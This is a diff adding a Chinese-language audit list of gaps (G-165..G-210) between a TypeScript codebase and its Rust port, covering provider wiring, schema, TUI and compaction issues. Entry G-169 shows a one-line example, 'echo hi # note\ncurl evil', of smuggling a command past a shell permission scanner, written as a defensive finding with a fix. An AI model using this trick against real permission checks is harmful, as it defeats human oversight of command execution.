@@ -1,5 +1,7 @@
 # 移植缺口与坑（Gaps & Pitfalls）
 
+> **2026-11-03 第十二轮（全量对比审查）**：22 通道逐文件全文对读（TS ~21 万行 / Rust ~40 万行生产代码）+ 3 通道缺口核验，对 50 项缺口声称逐项双侧源码取证：**新立项 46 项（G-165..G-210，含 🔴×6：Azure 未接线/Mcp.Protocol wire bug/Copilot anthropic 车道/第三方 anthropic 根 URL/shell 注释换行权限逃逸/transfer 脱敏弱）**、撤销 4 项初报 + 6 项子句修正（见文末第十二轮勘误）、5 项归类既有条目。总报告 `CODE_REVIEW_PARITY_2026-11-03.md`，域报告与核验记录 `/tmp/opencode/review/`。
+
 > **2026-11-02 第十一轮 burndown 收口（gap-burndown-7）**：第十轮立项的 G-105..G-164 全部 60 项经 lanes 1-9 落地并合并 main（lane1 ce86cd7 / lane2 a3485a4 / lane3 ed23543 / lane4 b0a026f / lane5 56e8d36 / lane6 e8c3b7f / lane7 18363aa / lane8 34837c8 / lane9 本轮合并），逐条状态改标 ✅（G-163/G-164 维持 ℹ️ 登记项，G-161② 已修）。各 lane 有界偏离清单见文末第十一轮。
 
 > **2026-11-02 第十轮（全量逐行复审）**：9 通道逐行对读 + 6 轮补审 + 4 通道缺口复核，对全部初报缺口逐项双侧源码取证后确认 60 项新立项（G-105..G-164）、驳回 13 项初报（见文末第十轮勘误）、若干 DUP 归并既有条目（G-6/G-17/G-32/G-49a 已追加备注）。总报告 `CODE_REVIEW_PARITY_2026-11-02.md`，明细 `/tmp/opencode/review/`。
@@ -1050,3 +1052,202 @@ G-93..G-104 全部 ✅。现存未关闭项维持既有文档化决策：G-28（
 - 本轮（lane9）新增有界偏离：G-162① npmrc 级联的 `PREFIX` 仅取环境变量（不 spawn npm，不推导 node 安装前缀）；G-162② oc-ai bedrock SSO 缓存名 sha1 保留本地依赖（SDK crate 不引 oc-util）；G-161② canonicalize 失败回退原路径。
 
 现存未关闭项仍均为文档化决策（G-17 族、G-28、G-32 等），无新增待办。
+
+
+---
+
+## 第十二轮（2026-11-03 全量对比审查）新登记缺口（G-165..G-210）
+
+> 背景：22 条并行审查通道对端口范围内全部包（core/tui/cli/client/server/schema/theme/plugin/util/ai/codemode/merman）做逐文件全文对读（TS ~21 万行 / Rust ~40 万行生产代码），再经 3 条独立核验通道对 50 项缺口声称逐条双侧源码取证：46 项立项、4 项撤销、若干子句修正，全部与既有 G-1..G-164 去重。总报告 `CODE_REVIEW_PARITY_2026-11-03.md`，域报告与核验记录 `/tmp/opencode/review/`（session/tools/ai_*/plugin/mcp_auth/shell_pty/config/schema/bus_db/fsvcs/server/client/cli/theme_util/codemode/core_misc/tui_*/render_mermaid + verify_v1..v3）。
+
+### 🔴 高
+
+### G-165 ❌ Azure provider catalog 通道整体未接线（ai）
+- facade.rs:346-347 把 catalog `azure` 归入通用 OpenAIResponses 族；:795-801 仅 `bearer_auth`（env 链把非密钥 `AZURE_RESOURCE_NAME` 当凭据候选，snapshot env + catalog.rs:255 + facade.rs:556-562），无 api-key 头/api-version/resourceName/deployment URL。
+- openai_responses.rs:42,573 无 baseURL 兜底 → 未配 baseURL 静默错发 `https://api.openai.com/v1`；custom 通道有 azure 守卫（facade.rs:1362-1370 fail-fast）但 catalog 通道无。
+- oc-ai/protocols/azure.rs（392 行，azure_auth:103-109 / resource_base_url:40 / endpoint_parts:123）生产零调用；open_responses_channel.rs:424-425 虽引用其 WS helper，但 `responses_channel_enabled`(azure.rs:177-192) 要求 `.openai.azure.com`+`api-version=v1`，generic 路由永不满足 → 事实死代码。ref 基准 ai/src/providers/azure.ts:29-33,113-128。
+
+### G-166 ❌（wire bug）`Mcp.Protocol` serde 变体名大写（schema）
+- oc-schema/src/mcp.rs:26-35 枚举无 `rename_all`（仅 Dated 有 rename="2026-07-28"）→ wire 输出 `"Legacy"/"Auto"`；ref schema/src/mcp.ts:20 为小写 literals。
+- 该类型即 v2 config 类型（config/mcp.rs:20 re-export、config/normalize.rs:28 消费）→ `"protocol":"auto"` 反序列化失败。修法：`#[serde(rename_all="lowercase")]`（Dated 变体保留显式 rename）。
+
+### G-167 ❌ Copilot anthropic 车道 + 动态模型面整体缺失（ai）
+- **anthropic 逃逸通道缺**：ref 对 advertise `/v1/messages` 的模型由 models.ts:164 将 `package` 改写为 `@opencode/ai/providers/anthropic` 实现 lanes（github-copilot.ts:325-342 的 hook 不消费 "messages"）；rust copilot_responses.rs:94-101 分发不认 messages 落到 chat lane，且 CopilotModelEntry（copilot.rs:327-341）无 package 字段 → Claude-on-Copilot 错发 /chat/completions。
+- **动态模型同步死代码**：load_copilot_models/derive_copilot_models（copilot.rs:347,398）全仓仅 tests/copilot_models.rs 引用；facade 唯一 copilot import 是 copilot_chat_route（facade.rs:45）→ 新模型/别名/enterprise 端点不可见，仅静态 catalog。
+- **派生字段缺**：ref models.ts:129-196 另产 family/modalities/variants/released/cost(AIC→USD)/limit；rust 仅 id/model_id/name/enabled/endpoint/base_url。
+- **gpt-5-chat-latest 未隐藏**（ref github-copilot.ts:259-268 enabled=false，rust 零命中）；**免费标题通道 utilityTitle（gpt-4o-mini）未移植**（ref :398,415-475 + title hook :455-475）。
+
+### G-168 ❌ 第三方 Anthropic 根 URL 拼错（moonshot/zai-coding-plan/alibaba）（ai）
+- rust catalog.rs:192-199 把 snapshot `api`（chat 根）写入 settings.baseURL；AnthropicMessages 臂（facade.rs:787-792）仅 `with_base_url`，PATH="/messages"（anthropic_messages.rs:59）→ 拼成 `{chat根}/messages`。
+- ref 基准：moonshot.ts:86 `api.moonshot.ai/anthropic/v1`；zai-coding-plan.ts:45 `api.z.ai/api/anthropic/v1`；alibaba.ts:94-98 `${host}/apps/anthropic/v1`。minimax 不受影响（其 catalog api 本身是 anthropic 根）。facade 无 per-package anthropic 根特判（仅 bedrock-mantle :644 有）。
+
+### G-169 ❌（🔴 安全）shell 权限扫描：注释后换行被跳过 → 命令合并逃逸权限分类（core）
+- rust shell/scan.rs:1841-1848：`#` 注释分支 `index = newline + 1` 跳过换行；ref scan.ts:584-588 是 `index = newline - 1`（循环尾 ++ → 换行被访问，走 scan.ts:590 的 `;<>&|\n` 分隔符分支结束当前命令）。
+- 后果：`echo hi # note\ncurl evil` 在 rust 合并为**单条命令** `echo hi curl…`，save 前缀按 ARITY 取 `echo *` → 注释后一行任意命令逃避独立权限分类；且注释行处 pending heredoc 不在该换行读取。修法：改处理换行（等价 ref `index = newline` 再走分隔符路径）。
+
+### G-170 ❌ session transfer export 脱敏弱于 ref（core）
+- rust 服务端有 export 端点（oc-server/handlers/session.rs:2142-2174，`?sanitize=true`），但 sanitize 仅删 info/messages 的 `metadata` 字段（:2163-2172）；oc-core session/transfer.rs 只有 import（:34-70）无 export 服务。
+- ref transfer.ts:165-230 的 isSettled 过滤（:60,165-170）、redact 占位体系（:171-176）、title/directory/revert/text 脱敏（:180-230）全部缺 → sanitize 导出仍包含 ref 会脱敏的正文内容。与 G-75（CLI 面）互补不冲突。
+
+### 🟡 中
+
+### G-171 ⚠️ OpenAI/Azure gpt-5 默认选项 + chat 线 promptCacheKey 缺（ai）
+- ref openai-options.ts:35-47 `gpt5DefaultOptions`（reasoningEffort:"medium"/reasoningSummary:"auto" + gpt-5 门控排除 gpt-5-chat/pro）rust 零命中；openai.ts:103-106 两 lane 均应用。
+- chat 线 promptCacheKey：ref openai.ts:108/azure.ts:132 `compatibility:{supportsPromptCacheKey:true}`；rust openai/chat 绑定（facade.rs:891-897）无 compat → openai_chat.rs:2683-2686 `unwrap_or(false)` 丢弃。
+- 已按 route 默认落地的不算缺：store:false + include reasoning.encrypted_content（openai_responses.rs:534-552 = ref route defaults）。G-121 根因扩展。
+
+### G-172 ⚠️ MiniMax chat / Meta messages 专用协议未移植（ai）
+- ref minimax.ts:58-75,91：`thinking` 选项 + `reasoning_split` 默认 true（防 `<think>` 内嵌）+ compat{store/strict:false}；rust minimax/chat → 泛化 OpenAIChat（facade.rs:383），oc-ai 无 minimax overlay。
+- ref meta.ts:113-118 + meta-messages.ts:44-45：MetaMessages（web_search 降级、拒 searchContextSize、thinking adaptive 默认）+ requireSignature:false；rust meta/messages → 泛化 AnthropicMessages（facade.rs:334）。
+
+### G-173 ⚠️ ToolSchemaProjection 未中央化（ai）
+- ref route/client.ts:565 在 prepareRequest 对**所有**路由统一应用 objectRoot + 按模型名清洗；rust `project_tools` 仅 gemini.rs:1380 / mistral_chat.rs:525 / cohere_chat.rs:146 调用，anthropic_messages.rs:574、openai_chat.rs:1982、openai_responses.rs:648、bedrock/converse.rs:252 裸用 `input_schema` → 无 object 根的 schema 与 kimi 清洗在主链路缺失。修法：在 Route::prepare_request 统一调 sanitizer::resolve(model)::project_tools。
+
+### G-174 ⚠️ requireSignature 语义靠启发式（ai）
+- ref 显式 `requireSignature:false`：alibaba.ts:104 / meta.ts:141 / zai-coding-plan.ts:72 / vercel-ai-gateway.ts:264（仅 anthropic/ 前缀 true）；rust anthropic_messages.rs:1053-1080 仅 kimi/moonshot/xiaomi 启发式 → 四家全落 true，无签名 thinking 回放失败。
+- compat 钩子在协议侧存在（:1055-1060 读 `compatibility.require_signature`）但无注入方：facade package_chat_compatibility(:1063-1072) 不含 messages 族、overlay_model_compatibility(:1096-1108) 不转发、oc-schema model.rs:71-86 Compatibility 无该字段 → 配置亦无法表达。
+
+### G-175 ⚠️ chat 族 compat preset 注入不全（12+ 家）（ai）
+- facade.rs:1063-1072 仅注入 deepinfra/togetherai/cerebras/fireworks/digitalocean 五家（=G-119/G-121 修复成果）；专用工厂（facade.rs:871-887）与 chat_route 工厂（openai_chat.rs:3198-3223）均不带 compat，deepseek/groq 等 preset 函数仅 `#[cfg(test)]` 引用（openai_chat.rs:3626-3633）。
+- ref 注入 compat 的 chat 族：deepseek.ts:47 / groq.ts:92-98 / openrouter.ts:199 / venice.ts:43 / zai.ts:51 / zai-coding-plan.ts:68 / alibaba.ts:97 / minimax.ts:119 / moonshot.ts:111 / cohere.ts:43-48 / openai.ts:108 / azure.ts:132 / meta.ts:136 —— 全部未注入。G-118..G-121 根因扩展。
+
+### G-176 ⚠️ flowchart 汇流排分组键=edge_index（3/4 臂失效）（tui）
+- routing.rs:899-905 `source_key()/target_key()` 恒返回 `self.edge_index` → 每组单元素 → `len()<2` 恒跳过；失效臂：horizontal_fan_in(:809)/vertical_fan_out(:841)/vertical_fan_in(:873)。**horizontal_fan_out(:738) 按真实节点 id 分组功能正常**（同文件两种写法并存）。
+- ref merman routing.ts:426,468,488,509 按 `edge.from`/`edge.to` 分组。修法：三臂改用 diagram.edges[i].from/to。
+
+### G-177 ⚠️ TUI Markdown 表格降级为 raw 文本（tui）
+- oc-tui markdown.rs:211-304 渲染臂仅 Text/CodeBlock/Blockquote/HorizontalRule/List 五种；opentui-core 将 `Token::Table{raw}` 降级为 raw markdown 文本（opentui-core markdown.rs:501-517 自认 "TextTableRenderable is not yet ported"）→ 表格内容可见但无 grid 结构。ref index.tsx:2059/message-parts.tsx:188 用 `tableOptions{style:"grid",cellPaddingX:1}`。
+
+### G-178 ❌ mermaid 开放边 `A --- B` 仍渲染箭头（tui）
+- drawing.rs:262-273 `draw_routed_edge` 无条件画箭头（无 arrowhead 检查）；:480-482 虽对 `!edge.arrowhead` 补画线尾，但 style.rs:169-171 `merge_flowchart_cell` 的 `is_arrow_head(existing) → return existing` 使先画的箭头胜出、线尾被丢。ref drawing.ts:187-195 在 drawRoutedEdge 内先判 `edge.arrowhead !== false`。修法：draw_routed_edge 增加 arrowhead 参数。
+
+### G-179 ⚠️ mermaid seam 无流式截断恢复，宽度未接（tui）
+- markdown.rs:613-657 语法错误直接回退代码块；全仓 grep last_good/truncate-retry 零命中；ref merman markdown.ts:272,290-314 有 lastGood Map + 截断重试。
+- 宽度 clamp：渲染层管线在（render/mod.rs:84-119 layout_max_width.min(context_width)）但 seam 传 `MermaidRenderOptions::default()`（markdown.rs:631，context_width:None）→ 实际宽度从未接入。
+
+### G-180 ⚠️ codeme 沙箱文档化决策新增子项：Logs 捕获缺失 + guest fetch 暴露（codemode）
+- 沙箱架构（自研解释器→Bun guest）已收编文档化决策（见上文收编节），但两条子项为该决策下**新增**未登记面：
+- ① console 捕获缺失：host.js:168-171 将 console 重路由为 NDJSON log 通知，不进执行结果 Logs（:2364-2365 自认）；ref stdlib/console.ts:9,21 捕获入 ctx.logs → 结果里 console 输出对模型不可见。
+- ② guest fetch 暴露超 ref 面：ref codemode **无任何 fetch 面**（grep 零命中）；rust guest 为裸 Bun fetch 无超时/大小上限 —— 网络出口是 ref 沙箱不存在的能力面。
+
+### G-181 ❌ mini 四缺口：model 偏好死绑定 / /new 不可用 / SIGWINCH / 断线恢复（tui/mini）
+- ① runtime.rs:178 `let _preferences = ModelPreferenceRepository::new(...)` 下划线死绑定，全文件仅此一处（G-135 修的是 set_favorite 写路径，死绑定仍在）→ mini 内无法切换模型/变体。
+- ② /new 恒 "new sessions unavailable"（runtime.rs:490-496）；③ Lifecycle::resize 存在（lifecycle.rs:1139）但 mini 全目录零调用、无 SIGWINCH（主 TUI app.rs:9583 才有）→ resize 后 wrap 宽度错；④ :232-250 断线 500ms 盲重连同 client，无 reconnect client 替换、无 hydrate 重放（transport.rs:590-591 自认 "the live port boots once and never reconnects"）→ 断线窗口事件丢失。
+
+### G-182 ❌ 消息内多文件 patch 只渲染第一个文件（tui）
+- tool_detail.rs:283 `files.first()`；ref index.tsx:3333-3378 `<For each={files()}>` 每文件一张卡 → ApplyPatch 多文件变更只显示 1 个。
+
+### G-183 ❌ Question 工具无专用展示臂（tui）
+- tool_detail.rs:630-864 臂集无 "question"，走 generic `question [k=v,...]` 兜底（:839-863）；ref index.tsx:3424-3458 有专用问答块（answered → "# Questions" 问答对；pending → "Asking questions…"）。
+
+### G-184 ❌ 内联 shell 输出无流式拉取（≠G-33）（tui）
+- G-33 的 1s 轮询仅 DialogShellOutput 查看器（app.rs:4407-4412 + store.rs:15733-15748 测试）；消息内联臂（tool_detail.rs:210）仅静态 `state.output`。
+- ref index.tsx:2778,2826-2889：内联臂 cursor 增量 `shell.output` 拉取 + 1s 轮询 + SHELL_DISPLAY_LIMIT=1MiB + "[earlier output omitted]"——rust 全仓零命中。
+
+### G-185 ⚠️ prompt history 降级：纯字符串、无回灌（tui）
+- composer/mod.rs:232-255 `Vec<String>` 环（上限 100≠ref 50），无 PromptInfo（files/pasted 恢复）；storage.rs:254-268,448-465 prompt-history.jsonl 仅启动 heal+重写，解析结果不回灌 composer（:458-463 仅日志）。（注：stash 全套已在位——见勘误 #3。）
+
+### G-186 ❌ slash 命令表硬编码，不消费服务器 command.list（tui）
+- autocomplete.rs:140-251 V2_SLASH/SLASH_COMMANDS/ARGUMENT_SLASHES 三张静态表；oc-tui 全目录 grep `command.list` 零命中；ref autocomplete.tsx:486-494 将服务端命令并入候选 → 插件/自定义命令永远不出现。与 G-127（@-file 搜索，已修）不同面。
+
+### G-187 ❌ 工具输出图片（ToolImages）未渲染（tui）
+- rows.rs:536-580 image_strip_row 唯一调用点在 user_message_row；tool_detail 全臂 `images: Vec::new()`、tool_rows.rs 零图片引用；ref index.tsx:2456-2523（SessionImages + inlineToolImages）。mini 侧 tool_image_commits（mini/image.rs:102）仅作 dedup 标记。
+
+### G-188 ❌ 权限阻塞工具分区（partitionPending）未移植（tui）
+- ref rows.ts:71 + grouping/session.ts:163-176：等待授权的工具在折叠组外独立展示并沉底；rust components/message 零匹配（model.rs:610 的 pending 是排队输入，另一概念）→ 权限等待工具的可见性丢失。
+
+### G-189 ⚠️ DialogSelect 三缺：details 行 / locked / Tab action 焦点（tui）
+- ① SelectOption 无 `details` 字段（dialog_select.rs:45-65；:484-485 自认 wave-2）；② 无 `locked` 冻结；③ dialog.rs:737-753 键位层无 footer-action 焦点循环（ref dialog-select.tsx:434-443 moveAction+Tab；details 行 :816-824）。G-131（section 跳转）已修（dialog.rs:751-752），不同面。
+
+### G-190 ⚠️ PowerShell `separator_after` 反引号续行组未实现 → save 授权串失稳（core）
+- parse.rs:201-217 docstring 写着 ``/^\s+(?:`(?:\r\n|\r|\n)\s*)?/`` 但实现只贪心消费空白；ref parse.ts:278-279 正则含续行组 → 含续行的 PS 命令两侧生成不同通配授权串，升级后既有授权失配（重复弹权限）。
+
+### G-191 ❌ subagent / mcp-resource 工具 executor 绕过执行管道（core）
+- subagent.rs:652-656、mcp_resource.rs:265-277 直接 `register_executor` 裸注册；engine/mod.rs:2200-2205/2378-2381 直接调 register。标准路径 registry.rs:136-165 PipelineExecutor（before hook :207-227 → decodeInput :229 → leaf → after hook :294-334 → normalize_content :107）。
+- 后果：这两工具不吃 tool.execute.before/after hook、不 decodeInput、不 normalizeContent（ref subagent.ts:102 / mcp-resource.ts:17,49 经统一管道 tool.ts:150）。可见 bug：read_mcp_resource 纯文本资源 content=[]（TS 由 normalizeContent 回退 stringify）。修法：改走 register_builtin/PipelineExecutor 包装。
+
+### G-192 ⚠️ websearch：disable 移除 hook 缺 + Form kind 元数据缺（core）
+- ref websearch.ts:184-192 在 context/compaction/generate 三 hook 于 disabled 时删工具；rust websearch.rs 无任何 session hook（grep 零命中；engine/mod.rs:2455-2459 直接 register_builtin）→ 用户选 disable 后工具仍出现在请求列表。
+- ref websearch.ts:78,111 `metadata:{kind:"websearch.provider"}`；rust 两处表单（websearch.rs:373 及 choose 表单 :436 附近）`metadata: None` → 依赖 kind 分发的客户端无法路由。
+
+### G-193 ⚠️ 插件内建行为组 5 项缺失：plan/identity/verbosity/optimize/init+review（core）
+- 全仓库零命中：plan 模式注入（ref plugin/plan.ts；engine/mod.rs:2656-2713 seed_builtin_agents 无 plan agent）、模型 identity 注入（ref identity.ts:16-21 "# Your Model"）、GPT verbosity 自动 low（oc-ai 无 textVerbosity 注入；cli_config 的 verbosity 是 v1 schema 非请求注入）、per-provider system-prompt 优化模板（ref optimize.ts:10-16：gpt/astra/kimi/meta/trinity/anthropic）、command initialize/review（ref command/ 模板）。
+- （skill opencode+report **已在位**：engine/skills.rs:92-133 include_str 内嵌——见勘误 #4。）与 G-147/148（已修的 ctx.model/effect API）不同批。
+
+### G-194 ⚠️ compaction `due()` 边界：checkpoint 无 measured 时继续估算（core）
+- ref compaction.ts:242-251 `measured < findLastIndex(isCheckpoint)`——checkpoint 存在而 measured=-1 时 `-1 < idx` → return false（未到期）；rust runner/compaction.rs:916-941 `if let (Some,Some)` 才比较，measured=None 时继续 `estimate >= ceiling` → 刚完成 native 压缩、尚无新回复的会话可能重复触发压缩。
+
+### G-195 ⚠️ native compaction 两偏差：webSocket:false + finish=error 不重试（core）
+- rust compaction.rs:638-671 prepare 硬编码 `web_socket:false`（:660）；ref compaction.ts:335 native 传 `"session"`（:569-590）→ rust native 压缩不走 session WS 缝（model_request.rs:914 仅 true 才生成 WebSocketSeams）。
+- finish reason=error：ref compaction.ts:545-547 → `AIError(UnknownProviderError)` 可重试；rust compaction.rs:845-852 `FinishReason::Error => DeliverError::Failure`（Failure=永不重试）。
+
+### G-196 ⚠️ LocationActivity 驱逐语义：无 sweep 播种、无中断后复查（core）
+- rust location_services.rs:393-410 sweeper 对 expired 直接 interrupt+invalidate+remove；ref location-activity.ts sweep 先对 RcMap 缓存位置重新 touch（缓存位置不因空闲过期），中断 owners 后复查 execution.active，有新占用则 touch 保留不 invalidate。rust 有等价 bus touch（:364-380）但缺这两条 → 长空闲但 live 的位置被误驱逐、或驱逐刚接管的会话位置。
+
+### G-197 ⚠️ oc-client：~49 个方法缺 404 declared + 全部方法无 per-request RequestOptions（client）
+- 按名称对齐 ref promise/generated/client.ts（96 方法，83 个 404 declared）vs methods.gen.rs（142 op，75 个 404）：rust 缺 ~49 个 404 声明（agent.list、config.*、file.*、mcp.*、顶层 permission.*、plugin.*、project.list、provider.list、pty.create/list、session.export/import/skill/wait 等；部分已以别名路径声明如 fs.*↔file.*），另有 ~41 处多声明（命名迁移重合）。404 变 UnexpectedStatus，结构化 LocationNotFoundError 丢失。
+- ref client.ts:277-282 `{signal,headers,onActivity}` 每方法尾参透传；rust 全部 142 方法签名仅 `&self, input`，grep RequestOptions/signal/on_activity 零命中。
+
+### G-198 ⚠️ git/vcs：clone 无 --depth、快照 diff 无二进制检测/10MB 截断（core）
+- repository_cache.rs:242-250 `clone <remote> [--branch] <path>` 无 `--depth 100`（ref git.ts:246-258 `--depth (depth ?? 100)`）→ 全量克隆。
+- snapshot.rs:416-461 diff_blocking（git2）无二进制检测与 MAX_TOTAL_PATCH_BYTES=10MB 截断（ref git.ts:522-573 + vcs/patch.ts:8）；工作区 diff（oc-server/handlers/project.rs:1298-1300,1450-1535）已有 10MB cap 但同样缺 numstat "-"→patch 置空。与 G-30（git2 bounded）同域互补；BranchUpdated 事件已有（勘误 #5）。
+
+### G-199 ⚠️ `~/.claude/skills` / `~/.agents/skills` 兼容 skill 根未并入 skills 扫描（core）
+- rust config/discovery.rs:14,44-48 收集 .claude/.agents 根仅用于 instructions/config；skills 加载（engine/skills.rs:300-355）只扫 config skill/skills 目录+URL 源，未加 compat roots 的 `/skills`；ref compatibility.ts:39-56 明确扫描 → 从 Claude/Agents 迁移用户丢 skill。
+
+### G-200 ⚠️ TUI：session.viewed 无服务端确认 + 渲染器 terminalHandoff 缺（tui）
+- ref tui/context/session-tabs.tsx:209-242 view POST + 指数退避重试；rust oc-tui 仅从 session.list 的 `idle > viewed` 本地推导（data.rs:142-206，:196 自认 refinement 未做）→ 长离线 unread 陈旧。
+- ref cli/default.ts:143 + tui/app.tsx:193,218,229-236 渲染器移交（preflight→terminalHandoff）；rust handlers/misc.rs:79-80 直接 `oc_tui::app::run` 自建渲染器（G-152 的 onStart 钩子在，但无 handoff）。
+
+### 🟢 低
+
+### G-201 ⚠️ Vercel Gateway VERCEL_OIDC_TOKEN 回退失效（ai）
+- vercel_gateway.rs:42 `AUTH_ENV=["AI_GATEWAY_API_KEY","VERCEL_OIDC_TOKEN"]` 全仓无生产消费；实际 env 链 = catalog `["AI_GATEWAY_API_KEY"]`（经 facade.rs:815 生效）→ 仅 OIDC token 回退丢失；facade.rs:813 注释自称含 OIDC 亦不实。G-81 残留。
+
+### G-202 ⚠️ 裸 `$NAME` 扫描字符集缺 [A-Za-z]（core）
+- scan.rs:2809 `"_0123456789@*#?$!-"` vs ref scan.ts:1126 含字母 → `$FOO` 走普通字符路径、`$` 记入 literal → 更易置 bound_dollar → 与 variableSink/boundOpen 组合产生 ref 不会有的 dynamic-execution 拒绝（fail-closed 方向，非放行）。
+
+### G-203 🟢 ripgrep.find 服务面无 1:1 移植（core）
+- ref ripgrep.ts:52-61,193-218（exclude 模式链 `--glob=!`、onEntry 流式）唯一消费方 filesystem/search.ts:57-100；rust tool/ripgrep_runner.rs 仅移植二进制获取。fs find 端点已有原生索引等价实现（oc-server/handlers/fs.rs:254-336 + SearchIndex + ScanExclusions，注释引 ref search.ts:72）→ 记录实现路径差异（原生索引 vs rg 流式）+服务层缺口。
+
+### G-204 🟢 shell 工具 metadata 缺 signal/timeout 字段（core）
+- tool/shell.rs:568-578 metadata 仅 status/truncated?/exit?/shellID?；ref shell.ts:83-93 + shell/result.ts:36-43 展开含 signal?/timeout?。rust ShellToolOutput 的 output 本身有这两字段，缺的只是 metadata → 依赖 metadata 渲染 shell 卡片的 UI 缺信息。
+
+### G-205 🟢 toSessionError：缺 Tool.Error 嵌套解包 + Integration.AuthorizationError→provider.auth（core）
+- runner/mod.rs:506-542 仅 AiError 分支属实，但其余映射多已分布式存在（tool.execution step.rs:669,323、permission.rejected step.rs:681、no-route drain.rs:564-570、AgentNotFound context.rs:1338-1348）。真缺：ref to-session-error.ts:64-71 嵌套 AIError 递归解包+空 message 回退、Integration.AuthorizationError→provider.auth（integration/types.rs:303 有类型，runner 无映射）。
+
+### G-206 🟢 promptCacheKey 校验接受大写 hex（core）
+- model_request.rs:793-802 `is_ascii_hexdigit` vs ref model-request.ts:278 正则仅小写。实际影响≈0：两侧 Identifier 生成器均为 `ses_`+26 字符（identifier.ts:3-26 / identifier.rs:15+），生成的 id 永不命中 64-hex 分支 → 分歧仅在人为构造串可见。
+
+### G-207 🟢 publishAll 批内 created 时间戳共享 + ephemeral data 强校验 is_object（core）
+- bus.rs:696 整批一次取时钟（ref bus.ts:531-560 每事件各自取）→ 跨实现混用数据时重放幂等比较可产生假性分歧；bus.rs:625-628（publishAll :686 同）对 ephemeral 事件新增 `!data.is_object()` 拒绝（ref 无形状校验）→ Rust 附加约束，可拒合法发布。
+
+### G-208 🟢 CLI cli-upgrade flock 缺失（cli）
+- ref updater.ts:131,399 `flock.acquire("cli-upgrade",15min)`；rust oc-cli grep flock 零命中 → 并发升级竞态无互斥。（本批 update 流其余声称与 G-99✅/G-156✅ 重叠、method 探测=G-17 有意裁剪，仅此点为新。）
+
+### G-209 🟢 Modal 动态模型发现缺失（ai）
+- ref core/src/modal/models.ts + plugin/provider/modal.ts（Modal API load/derive：price/limit/variants 模板合成）；rust 全仓库零命中（provider_catalog/plugin-host 均无）。
+
+### G-210 🟢 theme generateSystem 系统主题生成缺失（tui/theme）
+- ref 实际位于 packages/tui/src/theme/system.ts:11-60（调色板→系统主题派生）；rust oc-tui/theme.rs:349-366 system 槽回退 v2 opencode 文档——有 OSC 11 模式检测（theme.rs:10-13）但无调色板派生。
+
+## 归类与收编（第十二轮，不另立项）
+
+- **剪贴板 host 写臂** → 重复 G-39（ℹ️ 有意，仅 Osc52Sink：app.rs:7810、store.rs:5885-5893），维持不变。
+- **ai experimental/（Evaluation/system-one）** → 归类 G-7（evaluation lane 有意不移植）。
+- **session.diff 经 SSE 公开** → 记录性分类面差异，不立项：registry.rs:217-220 注册致 is_public=true（event_manifest.rs:70），但全仓无发布点（仅 HTTP 端点 handlers/session.rs:1366；ref 同样从不发布）→ SSE 实际不转发。若未来开始发布 session.diff，需先并入 PRIVATE_TYPES。
+- **插件 aisdk.language 句柄不可替换 / TUI 插件 API 收窄** → 已由 G-2 备注与 G-28 文档化决策覆盖；本轮新证据（plugin_apply.rs:2155）与之一致。
+- **`aisdk:` npm 动态安装桥 / 动态 npm provider 工厂** → 归类 G-17 有意省略族（ref sdk-factory 运行时 npm 安装；rust typed error）。
+
+## 勘误（第十二轮经核验撤销/修正的初报，勿再列入待修）
+
+1. **bus log() 有界 64 静默断流** — 不属实：bus.rs:1108 channel(64) 但 `tx.send().await` 为背压等待；send 失败仅当 receiver 丢弃（消费者主动关闭）=预期取消语义；wake 读前 re-arm + cursor 基 read_through（:1114-1121,1165-1189），慢消费者不丢事件。与 ref 差异仅在缓冲策略。
+2. **无状态 Generate.text 服务缺失** — 不属实：oc-server/handlers/misc.rs:42-114 已完整实现（POST /api/experimental/generate，routes.gen.rs:288-299；prompt 校验、ModelSelection/Unavailable 映射 :69-91、x-opencode-session 头 :96-100、503 UnavailableError）；差异仅为架构位置（server handler 内联 vs ref core 服务层）。
+3. **prompt stash 全套缺失** — 撤销：stash 已全套在位（storage.rs:236-309、store.rs:9555-9658 stash_init 完整恢复 chips、:9757 push、:9789 pop、command_palette.rs:308-352 三命令、app.rs:7693 boot 接线）。仅 history 半边成立（→G-185）。
+4. **内建 skill opencode+report 缺失** — 撤销：engine/skills.rs:92-133 include_str 内嵌已注册。
+5. **VCS 无 BranchUpdated 事件流** — 撤销：`vcs.branch.updated` 已有（announce.rs:532、sse.rs:719、tests/be1_lane.rs:303）。
+6. **workspace 驱动注册表"仅 DB 表"** — 撤销：environment/workspace.rs 有 Registry.register(:82-94)+local driver+create/provision/connect/destroy(:145-237)；deferred 仅 idle janitor/共享 provision/连接池（模块头 :3-10 注释，非 local provider 时才 load-bearing）。
+7. **Vercel Gateway env 链为空** — 修正：AI_GATEWAY_API_KEY 经 catalog environment 生效（facade.rs:815）；仅 VERCEL_OIDC_TOKEN 丢失（→G-201）。
+8. **session.diff SSE 泄露** — 降级：无发布点，实际暴露面与 ref 一致（见归类节）。
+9. **codemode "ref fetch 30s 超时封装未移植"** — 撤销该出处：ref codemode 无 fetch 面（grep 零命中）；rust 裸 Bun fetch 属暴露面超 ref（→G-180②）。
+10. **oc-client 404 declared 缺 ~30** — 修正为 ~49（按名称对齐后实测；另 ~41 处多声明为命名迁移重合）。
